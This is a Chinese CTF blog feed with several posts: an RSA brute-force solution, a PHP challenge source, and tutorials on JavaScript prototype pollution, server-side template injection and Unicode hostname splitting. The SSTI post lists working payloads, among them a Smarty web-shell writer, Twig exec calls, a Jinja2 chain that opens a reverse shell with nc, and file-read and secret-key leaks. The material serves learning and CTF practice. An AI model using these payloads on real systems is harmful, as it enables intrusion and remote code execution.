title="real-baby-rsa"></a>real-baby-rsa</h2><p>告诉了我们N,e以及所有加密后的密文，直接爆破。(做的时候又是那样想的：怎么可能这么简单！(这么简单开始的时候还不知道替换掉换行符，搞了半天没做成😔(；′⌒`)))</p><pre><code>#flag = &apos;TWCTF{CENSORED}&apos;#print(flag)# Public ParametersN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537# Encrypt the flag!#for i in flag1:for char in flag:    print(pow(ord(char), e, N))</code></pre><p>解密脚本：</p><pre><code>import string#flag = &apos;TWCTF{CENSORED}&apos;flag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;#print(flag)# Public ParametersN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537content = open(&quot;output&quot;).readlines()for line in content:    line = line.replace(&apos;\n&apos;, &apos;&apos;)    for char in flag:        #print char        #print(pow(ord(char), e, N))        m = pow(ord(char), e, N)        #print(m)        #print(line)        if str(m) == str(line):            #print(m)            print(char),            break</code></pre><p>再贴一个国外师傅写的，看起来就是比上面的优雅一点😀，别问为什么贴两个？问就是喜欢收集！</p><pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537#create ist ascii charlist_ascii = []for i in range(33,126):    list_ascii.append(chr(i))#read each part of cipher text in to listlineList = list()lineList = [line.rstrip(&apos;\n&apos;) for line in open(&quot;output&quot;)]#starting burte forcemesg = &quot;&quot;for cir in range(0,len(lineList)):    for m in list_ascii:        test_str = pow(ord(m),e,N)        test_str = str(test_str)        if(lineList[cir] in test_str):            mesg += m            breakprint(mesg)</code></pre><h2 id="php-note"><a href="#php-note" class="headerlink" title="php-note"></a>php-note</h2><pre><code>first name :1lastname: {{2*2}}</code></pre><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg" alt="登陆成功"></p><p>查看源码得到hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p><p>读源码</p><pre><code> &lt;?phpinclude &apos;config.php&apos;;class Note {    public function __construct($admin) {        $this-&gt;notes = array();        $this-&gt;isadmin = $admin;    }    public function addnote($title, $body) {        array_push($this-&gt;notes, [$title, $body]);    }    public function getnotes() {        return $this-&gt;notes;    }    public function getflag() {        if ($this-&gt;isadmin === true) {            echo FLAG;        }    }}function verify($data, $hmac) {    $secret = $_SESSION[&apos;secret&apos;];    if (empty($secret)) return false;    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);}function hmac($data) {    $secret = $_SESSION[&apos;secret&apos;];    if (empty($data) || empty($secret)) return false;    return hash_hmac(&apos;sha256&apos;, $data, $secret);}function gen_secret($seed) {    return md5(SALT . $seed . PEPPER);}function is_login() {    return !empty($_SESSION[&apos;secret&apos;]);}function redirect($action) {    header(&quot;Location: /?action=$action&quot;);    exit();}$method = $_SERVER[&apos;REQUEST_METHOD&apos;];$action = $_GET[&apos;action&apos;];if (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {    redirect(&apos;index&apos;);}if ($action === &apos;source&apos;) {    highlight_file(__FILE__);    exit();}session_start();if (is_login()) {    $realname = $_SESSION[&apos;realname&apos;];    $nickname = $_SESSION[&apos;nickname&apos;];    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))            : new Note(false);}if ($action === &apos;login&apos;) {    if ($method === &apos;POST&apos;) {        $nickname = (string)$_POST[&apos;nickname&apos;];        $realname = (string)$_POST[&apos;realname&apos;];        if (empty($realname) || strlen($realname) &lt; 8) {            die(&apos;invalid name&apos;);        }        $_SESSION[&apos;realname&apos;] = $realname;        if (!empty($nickname)) {            $_SESSION[&apos;nickname&apos;] = $nickname;        }        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);    }    redirect(&apos;index&apos;);}if ($action === &apos;logout&apos;) {    session_destroy();    redirect(&apos;index&apos;);}if ($action === &apos;post&apos;) {    if ($method === &apos;POST&apos;) {        $title = (string)$_POST[&apos;title&apos;];        $body = (string)$_POST[&apos;body&apos;];        $note-&gt;addnote($title, $body);        $data = base64_encode(serialize($note));        setcookie(&apos;note&apos;, (string)$data);        setcookie(&apos;hmac&apos;, (string)hmac($data));    }    redirect(&apos;index&apos;);}if ($action === &apos;getflag&apos;) {    $note-&gt;getflag();}?&gt;&lt;!doctype html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PHP note&lt;/title&gt;    &lt;/head&gt;    &lt;style&gt;        textarea {            resize: none;            width: 300px;            height: 200px;        }    &lt;/style&gt;    &lt;body&gt;        &lt;?php        if (!is_login()) {            $realname = htmlspecialchars($realname);            $nickname = htmlspecialchars($nickname);        ?&gt;        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;        &lt;/form&gt;        &lt;?php        } else {        ?&gt;        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;        &lt;br/&gt;        &lt;br/&gt;        &lt;?php            foreach($note-&gt;getnotes() as $k =&gt; $v) {                list($title, $body) = $v;                $title = htmlspecialchars($title);                $body = htmlspecialchars($body);        ?&gt;        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;        &lt;?php            }        ?&gt;        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;            &lt;br&gt;            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;        &lt;/form&gt;        &lt;?php        }        ?&gt;        &lt;?php        ?&gt;        &lt;script&gt;            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {                const nickname = document.querySelector(&quot;input#nickname&quot;)                const firstname = document.querySelector(&quot;input#firstname&quot;)                const lastname = document.querySelector(&quot;input#lastname&quot;)                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()                }            })        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt; </code></pre><p>没做完，先留坑</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Prototype 污染攻击</title>
      <link href="/2019/08/31/JavaScript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/08/31/JavaScript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>JS真有趣！</p><a id="more"></a><h1 id="JavaScript-Prototype-污染攻击"><a href="#JavaScript-Prototype-污染攻击" class="headerlink" title="JavaScript Prototype 污染攻击"></a>JavaScript Prototype 污染攻击</h1><h2 id="JS基本语法"><a href="#JS基本语法" class="headerlink" title="JS基本语法"></a>JS基本语法</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li><p>window.alert();弹出警告框</p></li><li><p>console.log();将内容写到控制台</p><p>  a = 5;<br>  b = 6;<br>  c = a + b;<br>  console.log(c);<br>  11 debugger eval code:1:9<br>  undefined</p></li></ul><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>JS使用对象(Object)定义一个对象</p><pre><code>var person = {firstname:&quot;John&quot;,lastname:&quot;Doe&quot;};personObject { firstname: &quot;John&quot;, lastname: &quot;Doe&quot; }</code></pre><p>JS语句可以写在函数内，函数可以重复引用：<strong>引用一个函数</strong> = 调用函数(执行函数内的语句)</p><pre><code>function myFuncion(a,b) {  return a * b;}myFuncion(2,3)6</code></pre><p>JS大小写敏感</p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>我们可以通过定义变量来创建对象</p><pre><code>var car = {type:&quot;tzla&quot;,modle:500,color:&quot;white&quot;};</code></pre><p>这里，3个值<code>{&quot;tzle&quot;,500,&quot;white&quot;}</code>赋予变量car、3个变量<code>{type,modle,color}</code>赋予变量car.</p><p>通常认为JS对象是键值对的容器。</p><p>我们有两种方式访问对象属性</p><pre><code>car.modle;car[&quot;modle&quot;];</code></pre><p>对象的方法定义了一个函数，并作为对象的属性存储</p><pre><code>var person = {    firstName: &quot;John&quot;,    lastName : &quot;Doe&quot;,    id : 5566,    fullName : function()     {       return this.firstName + &quot; &quot; + this.lastName;    }};</code></pre><p>对象方法通过添加()调用(作为一个函数)。</p><pre><code>name = person.fullName();</code></pre><p>如果访问person对象的fullName属性，<code>name = person.fullName;</code> 他将作为一个字符串返回。</p><h2 id="prototype-和-proto-分别是什么"><a href="#prototype-和-proto-分别是什么" class="headerlink" title="prototype 和 __proto__ 分别是什么"></a><code>prototype</code> 和 <code>__proto__</code> 分别是什么</h2><p>我们以构造函数的方式来定义一个类</p><pre><code>function Foo() {    this.bar = 1}new Foo()</code></pre><p>Foo函数的内容就是Foo类的构造函数,而this.bar就是Foo类的一个属性。</p><p>我们也可以将方法定义在构造函数内部：</p><pre><code>function Foo() {    this.bar = 1    this.show = function() {    console.log(this.bar)    }}(new Foo()).show()</code></pre><p>但是这样的问题是每当我们新建一个Foo对象时，this.show = function…就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在”类”中。</p><p>我们使用原型(prototype)来实现在创建类的时候只创建一次show方法：</p><pre><code>function Foo() {    this.bar = 1}Foo.prototype.show = function show() {  console.log(this.bar)}let foo = new Foo()foo.show()</code></pre><p>foo可以调用<code>show</code>方法来输出结果<code>1</code>。</p><p>我们可以认为<code>prototype</code>是类<code>Foo</code>的一个属性，而所有Foo类实例化出来的对象都将拥有这个属性中的所有内容，包括变量和方法，就像foo具有<code>foo.show()</code>方法。</p><p>我们可以通过prototype来访问Foo类的原型，但是Foo类实例化出来的对象是不能访问原型的，这里我们用到<code>__proto__</code>。</p><p>一个Foo类实例化出来的对象是可以通过foo.<strong>proto</strong>属性来访问Foo类的原型：</p><pre><code>foo.__proto__Object { show: show(), … }Foo.prototypeObject { show: show(), … }Foo.prototype === foo.__proto__ true</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476" alt="二者的关系"></p><p>于是我们知道：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性指向这个对象所在类的<code>prototype</code>属性</li></ol><h2 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承</p><pre><code>function Father() {    this.first_name = &apos;Donald&apos;    this.last_name = &apos;Trump&apos;}function Son() {    this.first_name = &apos;Melania&apos;}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)Name: Melania Trump</code></pre><p>在调用<code>son.last_name</code>的时候，JavaScript引擎做了这些事：</p><ol><li>在对象<code>son</code>中寻找<code>last_name</code></li><li>如果找不到，则在<code>son.__proto__</code>中寻找<code>last_name</code></li><li>如果仍然找不到，则在<code>son.__proto__.__proto__</code>中寻找<code>last_name</code></li><li>一次寻找，直到找到<code>Null</code>结束。<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code>，因此<code>Object</code>是所有原型链的最顶层。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560691466319-0c780440-b626-4d58-a3c0-315ccc5c3210.png#align=left&display=inline&height=444&name=image.png&originHeight=888&originWidth=1110&size=127913&status=done&width=555" alt></p><p>于是我们知道：</p><ol><li>每个构造函数(constructor)都含有一个原型对象<code>prototype</code></li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li><code>JavaScript</code>使用<code>prototype</code>链实现继承机制</li></ol><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>由上文我们可以知道<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>.那么，如果我们修改了<code>foo.__proto__</code>中的值，就可以修改<code>Foo</code>类.</p><p>同时我们也知道我们有两种方式去访问对象的属性，当我们通过指定下标的方式去访问的时候，我们可以通过<code>b[&quot;__proto__&quot;]</code>的方式去访问其原型对象</p><pre><code>a = []b = []b[&quot;__proto__&quot;][&quot;admintoken&quot;]=&quot;123456&quot;;a.admintoken&quot;123456&quot;</code></pre><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-服务器端模板注入</title>
      <link href="/2019/08/30/SSTI/"/>
      <url>/2019/08/30/SSTI/</url>
      
        <content type="html"><![CDATA[<p>终于到了学习SSTI的时间呢！</p><a id="more"></a><h1 id="SSTI-服务器端模板注入"><a href="#SSTI-服务器端模板注入" class="headerlink" title="SSTI-服务器端模板注入"></a>SSTI-服务器端模板注入</h1><p>8/30/2019 3:28:13 PM </p><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>使用PHP模板引擎Twig作例子演示注入原理</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值echo $output;</code></pre><blockquote><p>In this example the user controls the content of the template itself via the custom_email GET parameter, rather than a value passed into it. </p></blockquote><p><code></code>模板变量值作为参数来自于<code>GET</code>请求<code>$_GET[&quot;name&quot;]</code>。这段代码没什么问题。模板引擎默认会对渲染的变量值进行编码和转义，所以并不会造成<code>XSS</code>等。</p><p>但是如果我们修改代码</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分echo $output;</code></pre><p>我们将<code>GET</code>的参数直接作为模板的内容，不再对其进行编码和转义了则很容易出现攻击点。于是我们知道漏洞的原因是服务器端相信了用户的输入。</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>如何判断是否存在<code>SSTI</code>？</p><p>我们还以上面的代码为例：</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分echo $output;</code></pre><p>在Twing模板引擎里<code></code>不仅可以输出传递的变量外，还能执行一些基本的表达式然后将其作为模板变量的值。我们输入<code>name=20</code>,服务端得到内容为 <code>Hello 20</code>，会输出 <code>Hello 20</code>.</p><p>我们现在修改数据为</p><pre><code>IsVlun{{2*8}}OK</code></pre><p>服务器端收到内容为</p><pre><code>Hello IsVuln{{2*8}}OK</code></pre><p>由于作为Twing模板的默认注释形式，所以并不会被前端输出，而<code>2*8</code>则会被计算，最终输出</p><pre><code>Hello IsVuln16OK</code></pre><p>得到扫描的大致流程为</p><p><img src="http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png" alt="扫描流程(Twig)"></p><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><h2 id="常用引擎"><a href="#常用引擎" class="headerlink" title="常用引擎"></a>常用引擎</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ol><li>Smarty：<code>{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)}</code>、<code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}</code></li><li>Twig：<code>{{_self.env.setCache("ftp://attacker.net:2121")}}``{{_self.env.loadTemplate("backdoor")}}</code>、<code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></li><li>Blade：</li></ol><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><ol><li>JSP</li><li>FreeMarker：<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) }</code></li><li>Velocity</li><li>Spring boot</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ol><li>Jinja2：<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}</code><br> <code>//写文件</code> {{ config.from_pyfile('/tmp/evil') }} //加载system {{ config['SHELL']('nc xxxx xx -e /bin/sh') }} //执行命令反弹SHELL</li><li>django：<code>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}</code>、<code>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></li><li>tornado：<code>http://117.78.26.79:31093/error?msg={{handler.settings}}</code></li></ol><h2 id="如何判断引擎种类"><a href="#如何判断引擎种类" class="headerlink" title="如何判断引擎种类"></a>如何判断引擎种类</h2><p>这里参考james大神的文章</p><blockquote><p>Green and red arrows represent ‘success’ and ‘failure’ responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.</p></blockquote><p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="检测思路"></p><h2 id="OGeak-ctf-Render"><a href="#OGeak-ctf-Render" class="headerlink" title="OGeak-ctf Render"></a>OGeak-ctf Render</h2><p>题目链接：<a href="http://47.107.244.251:18080/" title="点这里" target="_blank" rel="noopener">http://47.107.244.251:18080/</a></p><p>查看后端代码</p><pre><code>var app = new Vue({    el: &apos;#app&apos;,    data: {        content: &apos;&apos;,        result: &apos;&apos;    },    methods: {        request: function(event) {            var vm = this            axios.post(&apos;/render&apos;, {                content: vm.content            })                .then(function (response) {                    console.log(response)                    vm.result = response.data.result                })                .catch(function (error) {                    console.log(error)                    vm.result = error                })        }    }})</code></pre><p>将我们的输入值返回给<code>result</code>进行输出.这里似乎没用到什么模板语法，但是它仍然会将<code>post</code>的<code>content</code>用模板的方式去渲染。</p><p>我们尝试常用的模板引擎语法测试</p><p>最终</p><pre><code>[[1+1]]</code></pre><p>被成功解析</p><p>我们随便访问一个页面发现是Spring boot,既然是Java写的那我们就java读文件，语法参考<a href="https://dotblogs.com.tw/cylcode/2018/09/21/170510" title="这里" target="_blank" rel="noopener">https://dotblogs.com.tw/cylcode/2018/09/21/170510</a></p><p>payload:</p><pre><code>[[${new java.io.BufferedReader(new java.io.FileReader(&quot;/flag&quot;)).readLine()}]]</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84</a><br><a href="https://portswigger.net/blog/server-side-template-injection#top" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection#top</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HostSplit-Exploitable</title>
      <link href="/2019/08/22/HostSplit/"/>
      <url>/2019/08/22/HostSplit/</url>
      
        <content type="html"><![CDATA[<p>🐱黑帽大会议题</p><a id="more"></a><p>8/22/2019 11:39:23 AM </p><h1 id="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习"><a href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习" class="headerlink" title="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</h1><h2 id="IDN-与-UTF-8"><a href="#IDN-与-UTF-8" class="headerlink" title="IDN 与 UTF-8"></a>IDN 与 UTF-8</h2><p><strong>IDN</strong></p><blockquote><p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。<br>科研人员又将纯数字表示的IP地址基础上推出更加便于记忆的字符型访问标识，即基于IP地址的域名系统。这些域名只能使用63个ASCII字符（”a-z”，”A-Z”，”0-9”，”-“）. 随着互联网在非英语国家的迅猛发展，九十年代末期国际互联网界提出了将原本只能使用63个ASCII字符的域名，采用本地语言文字来表示，也就是出现了对多语种域名的需求。</p></blockquote><p><a href="http://中国政府.政务/" target="_blank" rel="noopener">http://中国政府.政务/</a></p><p>这是我国的政府网站！</p><p><strong>UTF-8</strong></p><blockquote><p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，由Ken Thompson于1992年创建，现在已经标准化为RFC 3629。UTF-8用1到4个字节编码Unicode字符。用在网页上可以统一页面显示中文简体繁体及其它语言.</p></blockquote><p>Puny 编码 (Punycode)</p><blockquote><p>这是一个简易而准确的IDN ASCII 编码系统 (ASCII-Compatible Encoding (ACE))。它能转换一系列的 字符编码成为字符以符合主机名称(hostname)标准 (ASCII 字母，数位和连字符号)。<br>例: xn–0zwm56d.test </p></blockquote><pre><code>中国.政府-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id="Unicode-➔-ASCII-–-A-Two-Step-Process"><a href="#Unicode-➔-ASCII-–-A-Two-Step-Process" class="headerlink" title="Unicode ➔ ASCII – A Two Step Process"></a>Unicode ➔ ASCII – A Two Step Process</h2><ol><li>Normalization Convert characters to a “standardized form”.</li><li>Punycoding Turn Unicode into ASCII.</li></ol><p>意思就是说IDN的使用底层还是ASCII的功劳。先转换成标准形式然后进行puny编码。</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg" alt="转换过程"></p><h2 id="Splitting-Hostnames"><a href="#Splitting-Hostnames" class="headerlink" title="Splitting Hostnames"></a>Splitting Hostnames</h2><pre><code>https://evil.c℀.Example.com</code></pre><p>我们对他进行转换成ASCII会发生什么？</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg" alt="Normalizing "></p><pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything – it’s all ASCII now!</strong>也就是不用再次编码已经可以解析了</p><h2 id="python-utf-8-unicode-ascii互转"><a href="#python-utf-8-unicode-ascii互转" class="headerlink" title="python utf-8,unicode,ascii互转"></a>python utf-8,unicode,ascii互转</h2><p>unicode-&gt;ascii</p><pre><code>&gt;&gt;&gt; ord(u&apos;脑&apos;)33041</code></pre><p>ascii-&gt;unicode</p><pre><code>&gt;&gt;&gt; chr(33041)&apos;脑</code></pre><p>unicode &lt;=&gt; utf-8</p><pre><code>&gt;&gt;&gt; n = u.encode(&apos;utf8&apos;)&gt;&gt;&gt; nb&apos;\xe5\xb1\x8c&apos;&gt;&gt;&gt; m = n.decode(&apos;utf8&apos;)</code></pre><p>注：linux默认编码为unicode，若为其他两种编码进行转换，需unicode作为“媒介</p><h2 id="Python-was-vulnerable"><a href="#Python-was-vulnerable" class="headerlink" title="Python was vulnerable"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit &gt;&gt;&gt; url = &apos;http://canada.c℀.microsoft.com/some.txt&apos; &gt;&gt;&gt; parts = list(urlsplit(url)) &gt;&gt;&gt; host = parts[1] &gt;&gt;&gt; host &apos;canada.c℀.microsoft.com&apos; &gt;&gt;&gt; newhost = [] &gt;&gt;&gt; for h in host.split(&apos;.&apos;): ... newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) ... &gt;&gt;&gt; parts[1] = &apos;.&apos;.join(newhost) &gt;&gt;&gt; finalUrl = urlunsplit(parts) &gt;&gt;&gt; finalUrl &apos;http://canada.ca/c.microsoft.com/some.txt&apos; </code></pre><h2 id="Python-had-an-extra-variant"><a href="#Python-had-an-extra-variant" class="headerlink" title="Python had an extra variant"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse &gt;&gt;&gt; r=&apos;http://bing.com&apos;+u&apos;\uFF03&apos;+&apos;:password@products.office.com&apos; &gt;&gt;&gt; o = urlparse(r) &gt;&gt;&gt; o.hostname &apos;products.office.com&apos; &gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) &gt;&gt;&gt; a &apos;http://bing.com#:password@products.office.com&apos; &gt;&gt;&gt; o = urlparse(a) &gt;&gt;&gt; o.hostname &apos;bing.com&apos;</code></pre><h2 id="SUCTF-PythonNginx"><a href="#SUCTF-PythonNginx" class="headerlink" title="SUCTF PythonNginx"></a>SUCTF PythonNginx</h2><p>SUCTF中的一道题：</p><pre><code>    @app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return &quot;我扌 your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:        return &quot;我扌 your problem? 222 &quot; + host    newhost = []    for h in host.split(&apos;.&apos;):        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    #去掉 url 中的空格    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;我扌 your problem? 333&quot;</code></pre><p>爆破最后一位c</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():    for x in range(65536):        uni=chr(x)        url=&quot;http://suctf.c{}&quot;.format(uni)        try:            if getUrl(url):                print(&apos;11&apos;)                print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])        except:            passdef 